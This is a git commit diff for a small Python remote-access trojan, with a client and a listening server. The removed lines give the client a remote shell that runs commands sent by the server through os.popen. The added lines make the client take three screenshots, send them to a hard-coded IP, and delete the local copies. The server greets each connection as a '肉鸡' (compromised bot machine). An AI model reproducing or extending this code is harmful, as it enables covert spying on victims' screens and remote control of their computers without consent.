9c965c931829811d07fdbdcb74df98c7092e74d5
Gorilla-L <454275636v45z@gmail.com>
2021-06-28 20:12:13 +0800

    描述：         1. 可执行部分cmd命令         2. 可以屏幕截图 新增：         1. 执行部分cmd命令         2. “自定义命令”截取屏幕，并发送至服务端 修复：         1. 重复多次截取屏幕 缺陷：         1. 执行错误命令，会在客户端报错，服务端无响应。无法判断os.popen的返回值         2. 截取屏幕后，服务端发送命令无响应         3. 单个文件体积太大         4. 当传输数据较大时，服务端无法全部显示

--- client.py
+++ client.py
@@ -4,63 +4,51 @@ import time
 import os
 import struct
 
-server_ip = '10.16.73.29'
-# server_ip = '1.117.207.149'
-server_port = 8022
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 
 # 创建套接字、建立连接
 def client_service():
     try:
-        server_addr = (server_ip, server_port)
-        client.connect(server_addr)
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # 填写外网IP和端口
+        serveraddr = ("10.16.73.29", 9000)
+        client.connect(serveraddr)
+        # 截图并发送至Server
+        screenshot(client)
+        # 清除图片
+        for i in range(1, 4):
+            os.remove("screenshot_{}.jpg".format(i))
+
     except socket.error as e:
         pass
-
-    client.send("连接成功".encode())
-    while True:
-        new_socket = client.recv(1024)
-        cmd = new_socket.decode()
-
-        if len(cmd) > 0:
-            if cmd == "mexit":
-                client.send("断开链接".encode())
-                break
-            elif cmd == "screenshot":
-                screenshot(client)
-                os.remove("screenshot.jpg")
-            else:
-                cmd_result = os.popen(cmd)
-                client.send(cmd_result.read().encode())
-                cmd_result.close()
-                cmd = ""
-                cmd_result = ""
 
 
 # 截图并发送
 def screenshot(client):
-    # 使用pyautogui库函数截图
-    img = pyautogui.screenshot()
-    img.save("screenshot.jpg")
-    time.sleep(3)
+    cout = 0
+    # 截图三张
+    while cout < 3:
+        # 使用pyautogui库函数截图
+        img = pyautogui.screenshot()
+        cout += 1
+        img.save("screenshot_{}.jpg".format(cout))
+        time.sleep(3)
 
-    # 分包传输文件，包两端对称
-    filepath = "screenshot.jpg"
-    if os.path.isfile(filepath):
-        # 判断截图是否存在
-        # 每个包大小128bytes
-        fileinfopck = struct.pack("128sl", bytes(os.path.basename(filepath).encode("utf-8")),
-                                  os.stat(filepath).st_size)
-        client.send(fileinfopck)
-        # 数据分段发送
-        fileobj = open(filepath, "rb")
-        while True:
-            sendfiledata = fileobj.read(1024)
-            if not sendfiledata:
-                print("{}文件发送完毕".format(filepath))
-                break
-            client.send(sendfiledata)
+        # 分包传输文件，包两端对称
+        filepath = "screenshot_{}.jpg".format(cout)
+        if os.path.isfile(filepath):
+            # 判断截图是否存在
+            # 每个包大小128bytes
+            fileinfopck = struct.pack("128sl", bytes(os.path.basename(filepath).encode("utf-8")),
+                                      os.stat(filepath).st_size)
+            client.send(fileinfopck)
+            # 数据分段发送
+            fileobj = open(filepath, "rb")
+            while True:
+                sendfiledata = fileobj.read(1024)
+                if not sendfiledata:
+                    print("{}文件发送完毕".format(filepath))
+                    break
+                client.send(sendfiledata)
 
 
 if __name__ == "__main__":
--- server.py
+++ server.py
@@ -4,19 +4,16 @@ import threading
 import struct
 import os
 
-server_ip = ""
-server_port = 8022
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 
 def service():
     # 抛出错误
     try:
         # 创建套接字
-        # server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # 配置端口释放规则,1代表立即释放,默认2min
-        server_addr = (server_ip, server_port)
-        server.bind(server_addr)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serveraddr = ("", 9000)
+        server.bind(serveraddr)
         server.listen(10)
     except socket.error as e:
         print("*建立Socket失败,由于:", e, sep="")
@@ -24,28 +21,19 @@ def service():
 
     print("Wainting for Connection...")
 
-    new_socket, client_addr = server.accept()
     # 循环，业务等待
-    data = new_socket.recv(10240)
-    print(data.decode())
     while True:
-
-        cmd = input("shell >>> ")
-        new_socket.send(cmd.encode())
-        if cmd == "mexit":
-            break
-        elif cmd == "screenshot":
-            t = threading.Thread(target=receiveDataFromClient, args=(new_socket, client_addr))
-            t.start()
-        else:
-            data = new_socket.recv(10240)
-            print(data.decode())
+        # 确认链接
+        clientsocket, clientaddr = server.accept()
+        # 多线程
+        t = threading.Thread(target=receiveDataFromClient, args=(clientsocket, clientaddr,))
+        t.start()
 
 
 # 多线程接收数据
 def receiveDataFromClient(clientsocket, clientaddr):
     # 成功连接肉鸡的提示
-    # print("肉鸡来了{}".format(clientaddr))
+    print("肉鸡来了{}".format(clientaddr))
     while True:
         # 设定单次接收图片的数据流大小为128bytes
         fileinfosize = struct.calcsize("128sl")
@@ -58,7 +46,7 @@ def receiveDataFromClient(clientsocket, clientaddr):
 
             # 接收图片
             newfilename = os.path.join(str.encode("./"), str.encode("new_") + filename)
-            # print("接收文件{},另存为{}".format(filename, newfilename))
+            print("接收文件{},另存为{}".format(filename, newfilename))
 
             # 统计接收量
             recv_file_size = 0
@@ -75,7 +63,7 @@ def receiveDataFromClient(clientsocket, clientaddr):
                 tempfile.write(recvdata)
 
             tempfile.close()
-            # print("文件接收完成,保存在{}".format(newfilename))
+            print("文件接收完成,保存在{}".format(newfilename))
 
 
 if __name__ == "__main__":
